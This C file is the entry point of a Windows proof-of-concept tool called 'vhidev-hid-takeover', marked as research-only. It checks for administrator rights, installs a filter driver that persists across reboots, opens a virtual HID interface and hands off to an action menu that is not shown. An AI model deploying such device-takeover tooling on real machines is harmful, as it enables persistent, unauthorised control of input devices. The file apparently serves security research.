/* main.c - entry point.
 *
 *   1. check admin
 *   2. install the driver package if not already installed
 *   3. open the vhidev COL05 interface
 *   4. hand off to the menu loop
 *
 * The driver persists across reboots once installed, so step 2 is a no-op
 * on later runs. */
#include "common.h"
#include "install.h"
#include "hid.h"
#include "ui.h"

#include <string.h>

/* Build the absolute path to a file next to the running executable, so the
 * exe works regardless of the user's current directory (double-click,
 * explorer, task scheduler, etc.). */
static bool exe_relative(const char *leaf, char *out, size_t out_sz) {
    char exe[MAX_PATH];
    DWORD n = GetModuleFileNameA(NULL, exe, (DWORD)sizeof(exe));
    if (n == 0 || n == sizeof(exe)) return false;
    char *slash = strrchr(exe, '\\');
    if (!slash) return false;
    *slash = '\0';
    int r = snprintf(out, out_sz, "%s\\%s", exe, leaf);
    return r > 0 && (size_t)r < out_sz;
}

static void banner(void) {
    printf("\n");
    printf("    vhidev-hid-takeover - PoC\n");
    printf("    research use only. do not run outside a disposable VM.\n");
    printf("\n");
}

int main(void) {
    banner();

    if (!is_elevated()) {
        LOG_ERR("administrator privileges required (right-click -> Run as administrator)");
        pause_exit(1);
    }
    LOG_OK("running elevated");

    /* Locate resource\vhidflt.inf relative to the exe. */
    char inf_path[MAX_PATH];
    if (!exe_relative("resource\\vhidflt.inf", inf_path, sizeof(inf_path))) {
        LOG_ERR("could not resolve resource\\vhidflt.inf path");
        pause_exit(1);
    }

    if (vhidev_is_installed()) {
        LOG_OK("vhidev devnode already present (persists across reboots)");
    } else {
        LOG_INFO("vhidev not installed - installing from %s", inf_path);
        if (!vhidev_install(inf_path)) {
            LOG_ERR("install failed");
            pause_exit(1);
        }
        LOG_OK("vhidev installed");
    }

    HANDLE h = hid_open();
    if (h == INVALID_HANDLE_VALUE) {
        LOG_ERR("could not open vhidev COL05 interface");
        pause_exit(1);
    }
    LOG_OK("COL05 interface ready");

    LOG("");
    LOG_INFO("press enter to continue to the action menu...");
    (void)getchar();

    ui_main_loop(h);

    CloseHandle(h);
    LOG_OK("goodbye");
    return 0;
}
